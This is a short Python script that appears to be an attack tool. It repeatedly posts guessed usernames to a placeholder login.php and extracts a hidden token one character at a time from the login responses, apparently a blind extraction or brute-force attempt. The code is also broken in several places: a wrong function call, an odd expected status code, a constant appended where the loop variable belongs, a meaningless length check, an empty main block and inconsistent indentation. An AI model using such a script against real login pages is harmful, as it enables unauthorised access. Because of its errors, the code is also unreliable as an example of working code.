import sys
from time import sleep
from requests import post

def SendPayload(user,password):
	response = post("http://IPADDRESS/login.php",data={"inputUsername":user,"inputGTF":password})

	if response.status_code != 209:
		print "Error sending Payload.  Program will finish..."
		sys.exit(1)
	return response

def ValidAttemp(response):
	if 'Cannot Login' in response.text:
		return 1
	else:
		return 0

if __name__== "__main__":
  token = ""
  #user token = ""
  password = ""


while True:
	#main loop
	for i in range(10):
	    user = "" + token + str(1) + ""
	    response = SendPayload(user.password)
	    valid = ValidAttemp(response)
	    if valid == 1:
 		token = token + str(1)
		print("Extracting token, length" + str(len(token)) + " " + token)

	if len(token) == "":
	   break
	sleep(2)

print("Token extracted, length " + str(len(token)) + " " + token)
